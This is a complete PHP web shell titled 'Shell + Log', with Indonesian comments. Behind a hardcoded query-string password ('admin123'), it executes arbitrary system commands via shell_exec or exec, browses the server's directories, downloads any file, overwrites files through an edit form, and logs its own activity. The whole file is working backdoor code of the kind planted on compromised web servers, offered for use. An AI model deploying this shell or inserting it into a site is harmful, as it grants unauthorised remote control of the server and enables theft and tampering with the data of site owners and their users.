<?php
// VERSI DENGAN LOG - Tanpa email, tanpa fungsi aneh
$pass = 'admin123';

// LOG FUNCTION - PALING SEDERHANA
function catat($msg){
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $time = date('Y-m-d H:i:s');
    $log = "[$time] [$ip] $msg" . PHP_EOL;
    @file_put_contents('log.txt', $log, FILE_APPEND);
}

if(!isset($_GET['p']) || $_GET['p'] != $pass){
    catat('LOGIN ATTEMPT - Wrong password');
    echo '<form method=get><input type=password name=p><button>Login</button></form>';
    exit;
}

catat('LOGIN SUCCESS');

// Logout
if(isset($_GET['logout'])){
    catat('LOGOUT');
    header('Location: '.str_replace('?logout=1','',$_SERVER['REQUEST_URI']));
    exit;
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$cur = realpath($dir);
if(!$cur) $cur = '.';
$files = scandir($cur);
?>
<!DOCTYPE html>
<html>
<head><title>Shell + Log</title>
<style>
body{background:#1a1a2e;color:#fff;font-family:monospace;padding:20px}
a{color:#0f0;text-decoration:none}
a:hover{color:#ff0}
input,button{background:#333;color:#fff;border:1px solid #0f0;padding:5px}
.cmd{width:100%;padding:8px;margin:10px 0}
.log-btn{background:#0f0;color:#000;padding:5px 10px;border-radius:5px}
</style>
</head>
<body>
<div style="display:flex;justify-content:space-between;margin-bottom:20px">
    <h2>🔧 Shell</h2>
    <div>
        <a href="?p=<?php echo $pass; ?>&viewlog=1" class="log-btn">📋 View Log</a>
        <a href="?p=<?php echo $pass; ?>&logout=1">🚪 Logout</a>
    </div>
</div>

<form method=get>
<input type=hidden name=p value="<?php echo $pass; ?>">
<input type=hidden name=dir value="<?php echo $cur; ?>">
<input type=text name=cmd class="cmd" placeholder="Command" autocomplete="off">
<button>Run</button>
</form>

<pre style="background:#0a0a0a;padding:10px;overflow:auto;max-height:300px">
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    catat("COMMAND: $cmd");
    if(function_exists('shell_exec')){
        echo htmlspecialchars(shell_exec($cmd.' 2>&1'));
    }elseif(function_exists('exec')){
        exec($cmd.' 2>&1', $o);
        echo htmlspecialchars(implode("\n", $o));
    }else{
        echo "Command not available";
    }
}
?>
</pre>

<h3>📂 <?php echo htmlspecialchars($cur); ?></h3>
<table width="100%">
<?php foreach($files as $f): if($f=='.'||$f=='..') continue; $p=$cur.'/'.$f; $isdir=is_dir($p); ?>
<tr>
    <td><?php echo $isdir ? '📁' : '📄'; ?></td>
    <td><?php if($isdir): ?><a href="?p=<?php echo $pass; ?>&dir=<?php echo urlencode($p); ?>"><?php echo htmlspecialchars($f); ?></a><?php else: ?><?php echo htmlspecialchars($f); ?><?php endif; ?></td>
    <td><?php echo $isdir ? '-' : filesize($p).' B'; ?></td>
    <td><?php if(!$isdir): ?><a href="?p=<?php echo $pass; ?>&act=dl&file=<?php echo urlencode($p); ?>">Download</a> | <a href="?p=<?php echo $pass; ?>&act=edit&file=<?php echo urlencode($p); ?>">Edit</a><?php endif; ?></td>
</tr>
<?php endforeach; ?>
</table>

<?php
// Download
if(isset($_GET['act']) && $_GET['act']=='dl' && isset($_GET['file'])){
    $f=$_GET['file'];
    if(file_exists($f) && is_file($f)){
        catat("DOWNLOAD: ".basename($f));
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        readfile($f);
        exit;
    }
}

// Edit form
if(isset($_GET['act']) && $_GET['act']=='edit' && isset($_GET['file'])){
    $f=$_GET['file'];
    if(file_exists($f) && is_file($f)){
        $c=file_get_contents($f);
        echo '<hr><form method=post><textarea name=content style="width:100%;height:400px;background:#0a0a0a;color:#0f0;border:1px solid #0f0;font-family:monospace">'.htmlspecialchars($c).'</textarea><input type=hidden name=save value="'.htmlspecialchars($f).'"><button>Save</button></form>';
    }
}

// Save
if(isset($_POST['save']) && isset($_POST['content'])){
    catat("EDIT FILE: ".basename($_POST['save']));
    file_put_contents($_POST['save'], $_POST['content']);
    echo '<script>alert("Saved!");window.location.href="?p='.$pass.'&dir='.urlencode(dirname($_POST['save'])).'";</script>';
}

// View log
if(isset($_GET['viewlog']) && file_exists('log.txt')){
    echo '<hr><h3>📋 ACTIVITY LOG</h3>';
    echo '<pre style="background:#0a0a0a;padding:10px;overflow:auto;max-height:400px">';
    echo htmlspecialchars(file_get_contents('log.txt'));
    echo '</pre>';
}
?>
</body>
</html>
